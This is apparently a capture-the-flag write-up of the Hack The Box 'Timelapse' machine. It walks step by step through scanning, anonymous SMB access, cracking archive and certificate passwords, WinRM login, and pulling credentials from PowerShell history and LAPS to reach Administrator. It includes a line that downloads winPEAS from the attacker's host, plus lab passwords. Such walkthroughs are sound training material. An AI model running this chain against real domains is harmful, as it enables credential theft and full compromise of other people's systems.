Let's scan the ports....

`sudo rustscan -a 10.10.11.152 --scripts none --ulimit 5000`

`sudo rustscan -a 10.10.11.152 -p 53,88,135,139,389,593,636,464,445,5986,9389,49667,49674,49673,49696,62122 -- -sC -sV`

```txt
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-16 23:58:34Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-07-17T00:00:03+00:00; +8h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62122/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61209/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 13393/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-16T23:59:27
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:00
Completed NSE at 12:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.97 seconds
           Raw packets sent: 20 (856B) | Rcvd: 17 (732B)
```

Now, let's try to find any subdomains:

sudo nmap -sU 10.10.11.152 -oA trick
dig any @10.10.11.152 timelapse.htb
dig axfr @10.10.11.152 timelapse.htb

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://timelapse.htb/ -H "Host: FUZZ.timelapse.htb"`

As we know 5985/5986 ports might be exposed to smb servers, let's try to enemurate them:

`smbclient -L 10.10.11.152 -N`

```txt
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Shares          Disk
SYSVOL          Disk      Logon server share
```

`Shares` folder seems interesting.... Let's try to connect to it:
`smbclient //10.10.11.152/Shares/`

We can see the `winrm_backup.zip` file in the Dev directory. Let's download it:
`get winrm_backup.zip`
Seems like the zip is password protected, let's try to decrypt it by john:
`zip2john winrm_backup.zip > hash.txt`
`john -w=/usr/share/wordlists/rockyou.txt hash.txt`

We found the password: `supremelegacy`
After extracting, we found pfx file. Lets try to decrypt it again using john
`pfx2john legacyy_dev_auth.pfx > pfx_hash.txt`

The password is: `thuglegacy`

Now, lets extract the crt and key file so that we can try to log in via evil-winrm.

https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/

`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes`
`openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem`

https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out timelapse.key`
`openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out timelapse.crt`

`openssl rsa -in timelapse.key -out timelapse-decrypted.key`

Lets try to connect with evilwinrm

`evil-winrm -i 10.10.11.152 -c timelapse.crt -k timelapse.key`

We got in! and the user flag is located at: `C:\Users\legacyy\Desktop\user.txt`

Let's list all the users:

```txt
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX
```

Checking privileges with `net user`

```txt
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
```

`wget http://10.10.14.28/winPEASx86_ofs.exe -OutFile c:\\Users\legacyy\\Documents\\winPEAS.bat`
If we want to fetch the file from website.
OR
We can upload directy from our VM using the following command:

`upload /home/kali/hackthebox/winPEAS.bat`

After running the winPEAS, we found the powershell log directory, let's see if we can find any important information there....

`cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`
`cat ConsoleHost_history.txt`

```txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We found the pasword for user `svc_deploy`
User: `svc_deploy`
Pass: `E3R$Q62^12p7PLlC%KWaxuaV`

Let's try to execute commands as `svc_deploy` ....
`invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami /groups}`

```txt
GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

`invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}`

```txt
PSComputerName              : localhost
RunspaceId                  : 6c889dbe-869c-4a31-8efa-0a4f3b5113ce
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : XE$M/m[)1S/Q5};833fm]LAV
ms-Mcs-AdmPwdExpirationTime : 133027957323599312
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : 6c889dbe-869c-4a31-8efa-0a4f3b5113ce
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 6c889dbe-869c-4a31-8efa-0a4f3b5113ce
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : 6c889dbe-869c-4a31-8efa-0a4f3b5113ce
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :
```

Easier way to do all LAPS password dumping is to login as svc_deploy via evlil-winrm by the following command:
`evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'`
And then executing the following command directly:
`Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime` 

Admin password: `XE$M/m[)1S/Q5};833fm]LAV`

Let's login as admin via evil-winrm again:
`evil-winrm -i 10.10.11.152 -u Administrator -p 'XE$M/m[)1S/Q5};833fm]LAV' -S`

After logging in, we found the root flag in: `C:\Users\TRX\Desktop>root.txt`